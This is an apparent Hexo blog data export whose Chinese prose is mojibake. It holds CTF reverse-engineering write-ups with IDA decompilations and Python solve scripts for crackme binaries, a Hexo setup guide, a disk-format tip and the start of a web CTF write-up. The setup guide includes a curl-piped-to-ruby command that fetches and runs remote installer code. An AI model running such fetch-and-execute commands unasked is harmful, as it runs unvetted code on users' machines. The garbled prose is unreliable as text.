'\\x20\\xC3\\x1A\\xAE\\x97\\x3C\\x7A\\x41\\xDE\\xF6\\x78\\x15\\xCB\\x4B\\x4C\\xDC\\x26\\x55\\x8B\\x55\\xE5\\xE9\\x55\\x75\\x40\\x3D\\x82\\x13\\xA5\\x60\\x13\\x3B\\xF5\\xD8\\x19\\x0E\\x47\\xCF\\x5F\\x5E\\xDE\\x9D\\x14\\xBD'enc1 = ARC4.new(key).decrypt(flag)print enc1print '----------------base64----------------'replaced = ''Base64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'table = 'ABCDEFGHIJSTUVWKLMNOPQRXYZabcdqrstuvwxefghijklmnopyz0123456789+/'for ch in enc1: if ch in Base64: replaced += Base64[string.find(table, str(ch))] elif ch == '=': replaced += '='print base64.b64decode(replaced) New driveræ‹–è¿›ODä¸€è¿è¡Œå°±é€€å‡ºäº†ã€‚æ‹–è¿›idaå‘ç°æœ‰tlsåè°ƒè¯•ï¼š ç”¨PEviewæŸ¥çœ‹exeä¸­ç›¸å…³PEç»“æ„ï¼Œç„¶ååœ¨010editorä¸­å°†å¯¹åº”éƒ¨åˆ†çš„valueæ¸…é›¶ï¼š é™¤å»tlsåæŸ¥å£³å‘ç°æœ‰upxã€‚è„±å»åæ”¾è¿›idaï¼š 123456789101112131415161718int main_0()&#123; HANDLE thread_2; // [esp+D0h] [ebp-14h] HANDLE thread_1; // [esp+DCh] [ebp-8h] j_read_input(); hObject = CreateMutexW(0, 0, 0); j_strcpy(Dest, Source); thread_1 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)one, 0, 0, 0); thread_2 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)two, 0, 0, 0); CloseHandle(thread_1); CloseHandle(thread_2); while ( dword_418008 != -1 ) ; j_print_dest(); CloseHandle(hObject); return 0;&#125; ä¸€å¼€å§‹è¯»å–è¾“å…¥å­—ç¬¦ä¸²ï¼Œä¸­é—´åˆ›å»ºäº†ä¸¤ä¸ªçº¿ç¨‹ï¼Œç„¶åæœ€åä¸è¢«åŠ å¯†çš„flagè¿›è¡Œæ¯”è¾ƒä»¥åŠè¾“å‡ºflagã€‚å›å»çœ‹ä¸¤ä¸ªçº¿ç¨‹å‘ç°ç¬¬äºŒä¸ªçº¿ç¨‹æ²¡å¹²ä»€ä¹ˆäº‹ï¼Œä¸»è¦æ˜¯ç¬¬ä¸€ä¸ªçº¿ç¨‹è¿›è¡Œäº†åŠ å¯†ã€‚å…¶ä¸­åŠ å¯†å‡½æ•°çš„spæŒ‡é’ˆä¸å¹³è¡¡ï¼Œéœ€è¦ä¿®æ”¹æŒ‡é’ˆå€¼ã€‚ä¿®æ”¹åï¼Œè¿›å…¥å‡½æ•°ï¼š 1234567891011121314151617181920char **__cdecl encrypt(char *input, int index)&#123; char **result; // eax char v3; // [esp+D3h] [ebp-5h] v3 = input[index]; if ( (v3 &lt; 'a' || v3 &gt; 'z') &amp;&amp; (v3 &lt; 'A' || v3 &gt; 'Z') ) exit(0); if ( v3 &lt; 'a' || v3 &gt; 'z' ) // lower case &#123; result = (char **)table; input[index] = table[input[index] - 38]; &#125; else // upper case &#123; result = (char **)table; input[index] = table[input[index] - 96]; &#125; return result;&#125; å¯¹æ¯ä¸ªå­—ç¬¦å¤§å°å†™è¿›è¡Œäº†åˆ¤æ–­ï¼Œç„¶åå‡æ³•æ“ä½œã€‚è¿˜æœ‰ä¸€ç‚¹æ˜¯ä¸¤ä¸ªçº¿ç¨‹æ¯æ¬¡å¾ªç¯åˆ†åˆ«éƒ½sleepäº†100sï¼Œé‚£ä¹ˆä¾æ¬¡å¾ªç¯å°±ä¼šé€ æˆå¥‡å¶ä¾æ¬¡åŠ å¯†ã€‚solveè„šæœ¬ï¼š 12345678910111213table = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm'enc = [0x54, 0x4F, 0x69, 0x5A, 0x69, 0x5A, 0x74, 0x4F, 0x72, 0x59, 0x61, 0x54, 0x6F, 0x55, 0x77, 0x50, 0x6E, 0x54, 0x6F, 0x42, 0x73, 0x4F, 0x61, 0x4F, 0x61, 0x70, 0x73, 0x79, 0x53, 0x79]flag = ''for i in range(len(enc)): if i % 2 == 0: flag += chr(enc[i]) else: idx = table.index(chr(enc[i])) if idx &gt; 26: # lower case flag += chr(idx + 38) else: # upper case flag += chr(idx + 96)print 'flag:', flag Old driver32ä½exeæ–‡ä»¶ï¼Œæ‹–è¿›idaåï¼Œé™¤äº†åˆ¤æ–­äº†å­—ä¸²é•¿åº¦ä¸º40å’Œå‰åç¼€çš„checkï¼Œè¿˜å‘ç°å‡½æ•°è¢«åŠ å¯†äº†ï¼š 12345678910111213141516171819202122232425262728293031323334353637int __cdecl main(int argc, const char **argv, const char **envp)&#123; int i; // ecx signed int j; // eax char input[39]; // [esp+0h] [ebp-40h] char v7; // [esp+27h] [ebp-19h] int v8; // [esp+34h] [ebp-Ch] __int16 v9; // [esp+38h] [ebp-8h] char v10; // [esp+3Ah] [ebp-6h] input[0] = 0; memset(&amp;input[1], 0, 0x31u); printf(\"input flag:\\n\"); scanf(\"%50s\", input); if ( strlen(input) == 40 ) &#123; for ( i = 0; i &lt; (char *)nullsub_1 - (char *)dword_401000; ++i ) *((_BYTE *)dword_401000 + i) ^= 0xBBu; v9 = 32123; v8 = 1734437990; v10 = 0; j = 0; do &#123; if ( input[j] != *((_BYTE *)&amp;v8 + j) ) goto LABEL_8; ++j; &#125; while ( j &lt; 5 ); LOBYTE(i) = v7; if ( v7 != *((_BYTE *)&amp;v8 + j) )LABEL_8: exit(0); ((void (__fastcall *)(int, char *))loc_4010B0)(i, input); &#125; return 0;&#125; å¯ä»¥ç”¨IDAPythonæ¥patchä¸€ä¸‹ï¼š 123456from ida_bytes import *start_addr = 0x00401000end_addr = 0x00401260for i in range(start_addr, end_addr, 4): tmp = get_bytes(i, 1) patch_bytes(i, chr(ord(tmp) ^ 0xbb)) æˆ–è€…ç”¨OllydbgæŠŠè§£å¯†è¿‡åçš„ç¨‹åºdumpå‡ºæ¥ã€‚æ‰¾åˆ°åŠ å¯†è¿‡åçš„ä½ç½®è®¾ä¸‹æ–­ç‚¹ï¼Œæ–­ä¸‹æ¥ä¹‹ådumpå³å¯ï¼ˆæ³¨æ„å‰é¢è¿˜éœ€è¦è¿‡ä¸€ä¸ªé•¿åº¦çš„checkï¼‰ï¼š æŠŠdumpå‡ºæ¥çš„ç¨‹åºæ‹–è¿›idaï¼š 12345678910111213141516171819202122232425262728293031323334353637int __cdecl main(int argc, const char **argv, const char **envp)&#123; int i; // ecx signed int j; // eax char input[39]; // [esp+0h] [ebp-40h] char v7; // [esp+27h] [ebp-19h] int v8; // [esp+34h] [ebp-Ch] __int16 v9; // [esp+38h] [ebp-8h] char v10; // [esp+3Ah] [ebp-6h] input[0] = 0; memset(&amp;input[1], 0, 0x31u); printf(\"input flag:\\n\"); scanf(\"%50s\", input); if ( strlen(input) == 40 ) &#123; for ( i = 0; i &lt; (char *)nullsub_1 - (char *)maze_solve; ++i ) *((_BYTE *)maze_solve + i) ^= 0xBBu; v9 = '&#125;&#123;'; v8 = 'galf'; v10 = 0; j = 0; do &#123; if ( input[j] != *((_BYTE *)&amp;v8 + j) ) goto LABEL_8; ++j; &#125; while ( j &lt; 5 ); LOBYTE(i) = v7; if ( v7 != *((_BYTE *)&amp;v8 + j) )LABEL_8: exit(0); base64(i, input); &#125; return 0;&#125; è¿›å…¥åŠ å¯†å‡½æ•°åï¼Œå…ˆæ˜¯å¯¹å…­ä½å¼‚æˆ–ï¼Œç„¶åbase64å‡ ä½å­—ç¬¦ï¼Œæœ€åèµ°ä¸ªmazeã€‚solveè„šæœ¬ï¼š 123456789101112131415161718192021import base64flag = 'flag&#123;'enc1 = [0xF2, 0xEE, 0xEF, 0xF5, 0xD9, 0xEF]for i in range(len(enc1)): flag += chr(enc1[i] ^ 0x86)enc2 = 'z91c'[::-1] + 'fNWb'[::-1]flag += base64.b64decode(enc2)# maze# --------# g + +# + + ++ +# + + #+ +# + ++++ +# + ++++ +# + +# --------# 'a'-down '2'-up 'q'-left 'w'-rightpath = 'waaaaawwwww22222qqaaw'flag += pathflag += '&#125;'print 'flag:', flag ç§‹åå±±è½¦ç¥12$ file re5 re5: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1c630722da16df2163ff83ea21cce93bf6b71a87, not stripped 32ä½elfæ‹–è¿›idaæŸ¥çœ‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [esp+0h] [ebp-2F0h] char m_t; // [esp+80h] [ebp-270h] char matrix; // [esp+180h] [ebp-170h] char input; // [esp+282h] [ebp-6Eh] int pipes[2]; // [esp+2C8h] [ebp-28h] __pid_t pid; // [esp+2D0h] [ebp-20h] size_t length; // [esp+2D4h] [ebp-1Ch] int *v11; // [esp+2E4h] [ebp-Ch] v11 = &amp;argc; length = 0; memset(&amp;v4, 0, 0x80u); puts(\"input flag:\"); __isoc99_scanf(); length = strlen(&amp;input); if ( length != 64 ) return 0; if ( pipe(pipes) &lt; 0 ) exit(1); pid = fork(); if ( pid &lt; 0 ) exit(1); if ( pid &lt;= 0 ) // children process &#123; close(pipes[1]); read(pipes[0], &amp;input, length); ck2((char **)&amp;matrix, &amp;input); ck3((char **)key_matrix, (char **)&amp;matrix, (int)&amp;m_t, 8, 8, 8); if ( ck4((int)&amp;m_t) ) printf(\"Congratulate!!!\"); &#125; else // father process &#123; close(pipes[0]); ck1(&amp;input, length); write(pipes[1], &amp;input, length); wait(0); &#125; return 0;&#125; mainå‡½æ•°ä¸­ä¸»è¦æ˜¯å…ˆè¯»å–ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚æœé•¿åº¦ä¸ä¸º64åˆ™é€€å‡ºã€‚ä¹‹åforkäº†ä¸€ä¸ªå­è¿›ç¨‹ï¼Œç„¶åæ–°å»ºä¸€ä¸ªpipeï¼Œåœ¨çˆ¶è¿›ç¨‹æŠŠå­—ç¬¦ä¸²è¾“å…¥pipeï¼Œç»è¿‡ck1()ä¹‹åé€åˆ°pipeé‡Œï¼›å­è¿›ç¨‹ä»pipeè¯»å–å­—ç¬¦ä¸²ï¼Œç»è¿‡ck2()å’Œck3()åï¼Œåœ¨ck4()é‡Œåˆ¤æ–­ã€‚ä¸‹é¢ä¸€ä¸ªä¸ªåˆ†æã€‚ ck1()æ˜¯rot13åŠ å¯†ï¼š 12345678910111213141516171819202122232425262728293031int __cdecl ck1(char *input, int length)&#123; int result; // eax char v3; // [esp+Bh] [ebp-5h] int i; // [esp+Ch] [ebp-4h] for ( i = 0; ; ++i ) &#123; result = i; if ( i &gt;= length ) break; v3 = input[i] + 13; if ( input[i] &lt;= 96 || input[i] &gt; 122 ) &#123; if ( input[i] &lt;= 64 || input[i] &gt; 90 ) &#123; v3 = input[i]; &#125; else if ( (unsigned __int8)v3 &gt; 0x5Au ) &#123; v3 = input[i] - 13; &#125; &#125; else if ( (unsigned __int8)v3 &gt; 0x7Au ) &#123; v3 = input[i] - 13; &#125; input[i] = v3; &#125; return result;&#125; ck2()è¿™é‡ŒæŠŠè¾“å…¥çš„å­—ç¬¦ä¸²è½¬åŒ–æˆ8x8çš„çŸ©é˜µï¼š 123456789101112131415161718192021222324signed int __cdecl ck2(char **m, char *input)&#123; signed int result; // eax int v3; // eax char *v4; // edx int v5; // [esp+4h] [ebp-Ch] signed int i; // [esp+8h] [ebp-8h] signed int j; // [esp+Ch] [ebp-4h] result = 134520832; v5 = 0; for ( i = 0; i &lt;= 7; ++i ) &#123; for ( j = 0; j &lt;= 7; ++j ) &#123; v3 = v5; v5 += (int)&amp;(&amp;GLOBAL_OFFSET_TABLE_)[4290763520] + 1; v4 = (char *)input[v3]; result = j; (&amp;m[8 * i])[j] = v4; &#125; &#125; return result;&#125; ck3()å°†è¾“å…¥çš„çŸ©é˜µä¸ä¸€ä¸ªglobalçš„çŸ©é˜µkeyç›¸ä¹˜ï¼š 123456789101112131415161718192021222324252627int __cdecl ck3(char **key, char **input, char **a3, int a4_8, int a5_8, int a6_8)&#123; int result; // eax int m; // [esp+4h] [ebp-10h] int i; // [esp+8h] [ebp-Ch] int k; // [esp+8h] [ebp-Ch] int j; // [esp+Ch] [ebp-8h] int l; // [esp+Ch] [ebp-8h] for ( i = 0; i &lt; a5_8; ++i ) &#123; for ( j = 0; j &lt; a4_8; ++j ) (&amp;a3[8 * i])[j] = 0; &#125; for ( k = 0; ; ++k ) &#123; result = k; if ( k &gt;= a5_8 ) break; for ( l = 0; l &lt; a4_8; ++l ) &#123; for ( m = 0; m &lt; a6_8; ++m ) (&amp;a3[8 * k])[l] = &amp;(&amp;a3[8 * k])[l][(_DWORD)(&amp;key[8 * k])[m] * (_DWORD)(&amp;input[8 * m])[l]]; &#125; &#125; return result;&#125; æœ€åçš„ck4()å°†è¾“å‡ºçš„çŸ©é˜µä¸globalçš„enc_flagè¿›è¡Œæ¯”è¾ƒï¼š 123456789101112131415signed int __cdecl ck4(char **m)&#123; signed int i; // [esp+8h] [ebp-Ch] signed int j; // [esp+Ch] [ebp-8h] for ( i = 0; i &lt;= 7; ++i ) &#123; for ( j = 0; j &lt;= 7; ++j ) &#123; if ( (&amp;m[8 * i])[j] != *(char **)&amp;enc_flag[4 * (8 * i + j)] ) return 0; &#125; &#125; return 1;&#125; ä¸»è¦ç”¨numpyï¼Œå¯ä»¥æ¯”è¾ƒæ–¹ä¾¿åœ°å®ç°çŸ©é˜µé—´çš„è¿ç®—ã€‚è„šæœ¬å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435import numpy as npkey = [0x0000002B, 0x00000016, 0x0000001E, 0x00000053, 0x00000035, 0x00000039, 0x00000020, 0x00000029, 0x00000035, 0x00000063, 0x0000000A, 0x00000028, 0x0000002C, 0x00000006, 0x00000032, 0x0000002A, 0x00000055, 0x00000039, 0x00000014, 0x0000005F, 0x00000020, 0x00000019, 0x00000034, 0x00000021, 0x00000019, 0x0000000B, 0x0000005A, 0x00000009, 0x00000050, 0x00000034, 0x0000006F, 0x0000005C, 0x00000016, 0x0000001A, 0x00000068, 0x00000063, 0x00000034, 0x0000004E, 0x00000016, 0x00000045, 0x0000004C, 0x00000053, 0x0000002F, 0x0000003F, 0x0000003F, 0x00000028, 0x00000069, 0x00000051, 0x00000039, 0x00000044, 0x00000012, 0x00000024, 0x0000000A, 0x0000004D, 0x00000055, 0x00000031, 0x00000049, 0x0000003B, 0x00000040, 0x0000003B, 0x00000043, 0x00000028, 0x00000021, 0x00000036]enc = [0x00009A06, 0x0000879A, 0x00007DC4, 0x00008F1F, 0x000088AC, 0x0000850B, 0x0000785D, 0x0000822E, 0x00008FBC, 0x00007F69, 0x000081E5, 0x00008714, 0x00008572, 0x00008786, 0x00006A94, 0x000076FE, 0x0000A871, 0x00009A1E, 0x0000967E, 0x00009D97, 0x00009D4B, 0x00009AC6, 0x00007E38, 0x00008C62, 0x0000CD4A, 0x00009116, 0x0000A837, 0x0000A960, 0x0000A3A7, 0x00009B7E, 0x0000AC9C, 0x0000AB9E, 0x0000C94C, 0x0000AD7C, 0x0000A2C8, 0x0000BD86, 0x0000B1ED, 0x0000AD94, 0x0000A195, 0x0000AFE8, 0x0000ED71, 0x0000C239, 0x0000CD7E, 0x0000D459, 0x0000CEFF, 0x0000CBBC, 0x0000B972, 0x0000C36F, 0x0000A82A, 0x000089EF, 0x00008CBF, 0x00009AD1, 0x0000868F, 0x000086A6, 0x00007A26, 0x00007CD2, 0x0000C000, 0x0000A97A, 0x0000A470, 0x0000B3C8, 0x0000AFE5, 0x0000ABB9, 0x00008F7D, 0x0000A70A]key = np.mat(key).reshape(8, 8)enc = np.mat(enc).reshape(8, 8)# enc = key * out# out = keyé€† * encout = key.I * encout = out.reshape(1, 64).tolist()[0]for i in range(len(out)): out[i] = int(round(out[i]))print outflag = ''for i in range(len(out)): flag += chr(out[i])print flagdef rot13(s): out = '' for ch in s: tmp = ord(ch) + 13 if ch.isupper(): if tmp &gt; 90: tmp -= 26 elif ch.islower(): if tmp &gt; 122: tmp -= 26 else: tmp = ord(ch) out += chr(tmp) return outflag = rot13(flag)print 'flag:', flag CRYPTOè´æ–¯å®¶æ—æ°¸ä¸è¨€è´¥å„ç§baseè§£ç ã€‚ å£®å£®å¯èƒ½æ˜¯ç–¯äº†â€¦é€šè¿‡çŒªåœˆå¯†ç è§£å¼€ç¬¬ä¸€æ­¥ã€‚ MISCè¿™æ˜¯ç¥é­”é¬¼è¯é¢‘é¢˜ï¼Œè§£ç ç½‘ç«™åœ¨è¿™é‡Œã€‚ è¡¨æƒ…åŒ…10å—é’±ç”¨stegsolveæ‰“å¼€gifé€å¸§æŸ¥çœ‹ï¼Œå¿«é€Ÿçœ‹è¿‡260+çš„å›¾åƒåï¼Œæ”¶é›†åˆ°ä¸€å¼ äºŒç»´ç çš„å››ç‰‡ç¢ç‰‡ï¼Œç”¨ç¾å›¾ç§€ç§€æ‹¼æ¥èµ·æ¥ï¼Œå†XORä¸€ä¸‹ï¼Œæ‰«ç å¾—åˆ°flagã€‚ ç«¥å¹´ç”¨é‡‘æ‰‹æŒ‡ä½œå¼Šé€šå…³é­‚æ–—ç½—å¾—åˆ°flagã€‚ å‚è€ƒç½‘ç«™https://esebanana.github.io/2018/05/07/wp_2018_5_7_zjgsctf/https://bbs.pediy.com/thread-158896.htmhttps://esebanana.github.io/2018/04/08/re_10_tls_smc/https://esebanana.github.io/2018/04/12/re_11_tou_ke/https://www.52pojie.cn/thread-593356-1-1.html","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"https://qianfei11.github.io/tags/wp/"}]},{"title":"Macä¸‹åˆ©ç”¨hexoå’Œgithubæ­å»ºåšå®¢","slug":"Macä¸‹åˆ©ç”¨hexoå’Œgithubæ­å»ºåšå®¢","date":"2018-04-17T12:50:09.000Z","updated":"2018-10-06T05:51:38.423Z","comments":true,"path":"2018/04/17/Macä¸‹åˆ©ç”¨hexoå’Œgithubæ­å»ºåšå®¢/","link":"","permalink":"https://qianfei11.github.io/2018/04/17/Macä¸‹åˆ©ç”¨hexoå’Œgithubæ­å»ºåšå®¢/","excerpt":"æŠŠåŒç³»ç»Ÿçš„win10åˆ äº†ï¼Œæ”¹ç”¨macã€‚å‘ç°è‡ªå·±çš„åšå®¢å¿˜è®°å¤‡ä»½äº†ï¼Œåªå¥½åœ¨macä¸Šé‡æ–°æ­å»ºä¸€ä¸ªã€‚","text":"æŠŠåŒç³»ç»Ÿçš„win10åˆ äº†ï¼Œæ”¹ç”¨macã€‚å‘ç°è‡ªå·±çš„åšå®¢å¿˜è®°å¤‡ä»½äº†ï¼Œåªå¥½åœ¨macä¸Šé‡æ–°æ­å»ºä¸€ä¸ªã€‚ å®‰è£…æµç¨‹ï¼š 1.hexoæ˜¯åŸºäºnodejsçš„ï¼Œéœ€å®‰è£…nodejsï¼Œå®‰è£…nodejsæœ€å¥½é€‰æ‹©homebrew 2.é¦–å…ˆæŸ¥çœ‹ç”µè„‘æ˜¯å¦å®‰è£…rubyï¼Œå› ä¸ºhomebrewå®‰è£…ä¾èµ–ruby 3.å®‰è£…é¡ºåºï¼šhomebrew-&gt;nodejs-&gt;hexo å®‰è£…homebrew1ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot; å®‰è£…nodejs1brew install node å®‰è£…hexo1sudo npm install -g hexo åˆ›å»ºæ–‡ä»¶å¤¹123mkdir blogcd bloghexo init ç”Ÿæˆä¸€å¥—é™æ€ç½‘é¡µ12hexo generatehexo server åœ¨localhostçš„4000ç«¯å£ä¸Šå°±èƒ½çœ‹åˆ°æœ¬åœ°æ­å»ºçš„åšå®¢ æ’°å†™åšå®¢1hexo new post &quot;balabala&quot; â€˜balabalaâ€™å³ä¸ºåšæ–‡çš„åå­—ã€‚ ä¿®æ”¹é…ç½®1234deploy: type: git repo: https://github.com/xxx/xxx.github.io branch: master ç›´æ¥åœ¨_config.ymlä¸­ä¿®æ”¹é…ç½®ï¼ˆxxxä¸ºgithubçš„nameï¼‰ å®‰è£…hexo-deployer-git1npm install hexo-deployer-git --save åŒæ­¥github1hexo clean &amp;&amp; hexo generate &amp;&amp; hexo deploy è¿™æ ·åŸºç¡€çš„æ­å»ºå°±å®Œæˆå•¦ï¼","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://qianfei11.github.io/tags/hexo/"},{"name":"github","slug":"github","permalink":"https://qianfei11.github.io/tags/github/"},{"name":"mac","slug":"mac","permalink":"https://qianfei11.github.io/tags/mac/"}]},{"title":"è§£å†³å¤åˆ¶æ–‡ä»¶æ—¶å¯¹äºç›®æ ‡æ–‡ä»¶ç³»ç»Ÿæ–‡ä»¶è¿‡å¤§","slug":"è§£å†³å¤åˆ¶æ–‡ä»¶æ—¶å¯¹äºç›®æ ‡æ–‡ä»¶ç³»ç»Ÿæ–‡ä»¶è¿‡å¤§","date":"2018-02-26T09:00:34.000Z","updated":"2018-10-06T08:08:26.368Z","comments":true,"path":"2018/02/26/è§£å†³å¤åˆ¶æ–‡ä»¶æ—¶å¯¹äºç›®æ ‡æ–‡ä»¶ç³»ç»Ÿæ–‡ä»¶è¿‡å¤§/","link":"","permalink":"https://qianfei11.github.io/2018/02/26/è§£å†³å¤åˆ¶æ–‡ä»¶æ—¶å¯¹äºç›®æ ‡æ–‡ä»¶ç³»ç»Ÿæ–‡ä»¶è¿‡å¤§/","excerpt":"ä»Šå¤©åœ¨å¤åˆ¶ä¸€ä¸ªæ–‡ä»¶åˆ°Uç›˜çš„æ—¶å€™ï¼Œçªç„¶å¼¹å‡ºäº†â€˜å¯¹äºç›®æ ‡æ–‡ä»¶ç³»ç»Ÿè¿‡å¤§â€™çš„å¯¹è¯æ¡†ï¼Œä¸€ä¸ª4Gå¤šçš„æ–‡ä»¶å°±è¿™æ ·ä¸èƒ½å¤Ÿè¢«å¤åˆ¶åˆ°ç›®æ ‡ç›®å½•ä¸‹äº†ã€‚","text":"ä»Šå¤©åœ¨å¤åˆ¶ä¸€ä¸ªæ–‡ä»¶åˆ°Uç›˜çš„æ—¶å€™ï¼Œçªç„¶å¼¹å‡ºäº†â€˜å¯¹äºç›®æ ‡æ–‡ä»¶ç³»ç»Ÿè¿‡å¤§â€™çš„å¯¹è¯æ¡†ï¼Œä¸€ä¸ª4Gå¤šçš„æ–‡ä»¶å°±è¿™æ ·ä¸èƒ½å¤Ÿè¢«å¤åˆ¶åˆ°ç›®æ ‡ç›®å½•ä¸‹äº†ã€‚ å…¶å®è¿™æ˜¯ç›®æ ‡ç¡¬ç›˜çš„æ ¼å¼ä¸æ­£ç¡®çš„åŸå› ï¼Œæˆ‘è¿™ä¸ªUç›˜æ ¼å¼æ˜¯FAT32ï¼Œåº”è¯¥å°†å…¶ä¿®æ”¹æˆNTFSæ ¼å¼å°±å¯ä»¥äº†ã€‚ ä¿®æ”¹æ–¹æ³•ï¼šåœ¨cmdä¸­è¾“å…¥convert M:/fs:ntfsï¼Œå…¶ä¸­â€˜Mâ€™æ˜¯æ‰€åœ¨çš„ç£ç›˜ï¼ŒæŒ‰å›è½¦é”®ã€‚ æ ¼å¼è½¬æ¢å®Œæˆï¼Œå†æ¬¡å¤åˆ¶æ–‡ä»¶ï¼Œå³å¯æˆåŠŸï¼","categories":[],"tags":[{"name":"solution","slug":"solution","permalink":"https://qianfei11.github.io/tags/solution/"}]},{"title":"ç½‘ç»œå®‰å…¨å®éªŒå®¤-åŸºç¡€å…³-writeup","slug":"ç½‘ç»œå®‰å…¨å®éªŒå®¤-åŸºç¡€å…³-writeup","date":"2017-11-19T12:51:38.000Z","updated":"2018-11-11T05:05:11.547Z","comments":true,"path":"2017/11/19/ç½‘ç»œå®‰å…¨å®éªŒå®¤-åŸºç¡€å…³-writeup/","link":"","permalink":"https://qianfei11.github.io/2017/11/19/ç½‘ç»œå®‰å…¨å®éªŒå®¤-åŸºç¡€å…³-writeup/","excerpt":"ç¬¬ä¸€æ¬¡å†™wpï¼Œä¸»è¦æ˜¯ä¸€äº›webé¢˜ã€‚","text":"ç¬¬ä¸€æ¬¡å†™wpï¼Œä¸»è¦æ˜¯ä¸€äº›webé¢˜ã€‚ ç¬¬ä¸€é¢˜keyåœ¨å“ªé‡Œï¼Ÿåˆ†å€¼: 100è¿‡å…³åœ°å€ ç¬¬äºŒé¢˜å†åŠ å¯†ä¸€æ¬¡ä½ å°±å¾—åˆ°keyå•¦~åˆ†å€¼: 150åŠ å¯†ä¹‹åçš„æ•°æ®ä¸ºxrlvf23xfqwsxsqf ç¬¬ä¸‰é¢˜çŒœçŒœè¿™æ˜¯ç»è¿‡äº†å¤šå°‘æ¬¡åŠ å¯†ï¼Ÿåˆ†å€¼: 200åŠ å¯†åçš„å­—ç¬¦ä¸²ä¸º: Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVmpBeFYySkVUbGhoTVVwVVZtcEJlRll5U2tWVWJHaG9UVlZ3VlZacVFtRlRNbEpJVm10a1dHSkdjRTlaVjNSR1pVWmFkR05GU214U2JHdzFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm1wT1QwMHhjRlpYYlhSWFRWaENSbFpYZUZOVWJVWTJVbFJDVjAxdVVuWlZha1pYWkVaT2NscEdhR2xTTW1ob1YxWlNTMkl4U2tkWGJHUllZbFZhY1ZadGRHRk5SbFowWlVaT1ZXSlZXVEpWYkZKSFZqRmFSbUl6WkZkaGExcG9WakJhVDJOdFJraGhSazVzWWxob1dGWnRNWGRVTVZGM1RVaG9hbEpzY0ZsWmJGWmhZMnhXY1ZGVVJsTk5XRUpIVmpKNFQxWlhTa2RqUm14aFUwaENTRlpxUm1GU2JVbDZXa1prYUdFeGNHOVdha0poVkRKT2RGSnJhR2hTYXpWeldXeG9iMWRHV25STldHUlZUVlpHTTFSVmFHOWhiRXB6WTBac1dtSkdXbWhaTVZwaFpFZFNTRkpyTlZOaVJtOTNWMnhXYjJFeFdYZE5WVlpUWVRGd1YxbHJXa3RUUmxweFVtMUdVMkpWYkRaWGExcHJZVWRGZUdOSE9WZGhhMHBvVmtSS1QyUkdTbkpoUjJoVFlYcFdlbGRYZUc5aU1XUkhWMjVTVGxOSFVuTlZha0p6VGtaVmVXUkhkRmhTTUhCSlZsZDRjMWR0U2tkWGJXaGFUVzVvV0ZsNlJsZGpiSEJIV2tkc1UySnJTbUZXTW5oWFdWWlJlRmRzYUZSaVJuQlpWbXRXZDFZeGJISlhhM1JVVW14d2VGVXlkR0ZpUmxwelYyeHdXR0V4Y0hKWlZXUkdaVWRPUjJKR2FHaE5WbkJ2Vm10U1MxUnRWa2RqUld4VllsZG9WRlJYTlc5V1ZscEhXVE5vYVUxWFVucFdNV2h2VjBkS1dWVnJPVlpoYTFwSVZHeGFZVmRGTlZaUFYyaHBVbGhCZDFac1pEUmpNV1IwVTJ0b2FGSnNTbGhVVlZwM1ZrWmFjVk5yWkZOaVJrcDZWa2N4YzFVeVNuSlRiVVpYVFc1b1dGZFdXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZaZUdKSVNsaGhNMUpVVlcxNGQyVkdWbGRoUnpsb1RWWndlbFl5Y0VkV01ERjFZVWhLV2xaWFVrZGFWM2hIWTIxS1IyRkdhRlJTVlhCS1ZtMTBVMU14VlhoWFdHaFlZbXhhVjFsc1pHOVdSbXhaWTBaa2JHSkhVbGxhVldNMVlWVXhXRlZyYUZkTmFsWlVWa2Q0YTFOR1ZuTlhiRlpYWWtoQ1NWWkdVa2RWTVZwMFVtdG9VRll5YUhCVmJHaERUbXhrVlZGdFJtcE5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrNXlXa1pPYVZKcmNEWldhMk40WXpGVmVWTnVTbFJpVlZwWVZGYzFiMWRHWkZkWGJFcHNVbTFTZWxsVldsTmhWa3AxVVd4d1YySllVbGhhUkVaYVpVZEtTVk5zYUdoTk1VcFZWbGN4TkdReVZrZFdXR3hyVWpOU2IxbHNWbmRXTVZwMFkwZEdXR0pHY0ZoWk1HUnZWMnhhV0ZWclpHRldWMUpRVlRCVk5WWXhjRWhoUjJoT1UwVktNbFp0TVRCVk1VMTRWVmhzVm1FeVVsWlpiWFIzWVVaV2RHVkZkR3BTYkhCNFZrY3dOVll4V25OalJXaFlWa1UxZGxsV1ZYaFhSbFoxWTBaa1RsWXlhREpXTVZwaFV6RkplRlJ1VmxKaVJscFlWRlJHUzA1c1drZFZhMlJXVFZad01GVnRkRzlWUmxwMFlVWlNWVlpYYUVSVk1uaGhZekZ3UlZWdGNFNVdNVWwzVmxSS01HRXhaRWhUYkdob1VqQmFWbFp1Y0Zka2JGbDNWMjVLYkZKdFVubGFSV1IzWVZaYWNtTkZiRmRpUjFFd1ZrUktSMVl4VGxsalJuQk9UVzFvV1ZkV1VrZGtNa1pIVjJ4V1UySkdjSE5WYlRGVFRWWlZlV042UmxoU2EzQmFWVmMxYjFZeFdYcGhTRXBWWVRKU1NGVnFSbUZYVm5CSVlVWk9WMVpHV2xaV2JHTjRUa2RSZVZaclpGZGlSMUp2Vlc1d2MySXhVbGRYYm1Sc1lrWnNOVmt3Vm10V01ERkZVbXBHV2xaWGFFeFdNbmhoVjBa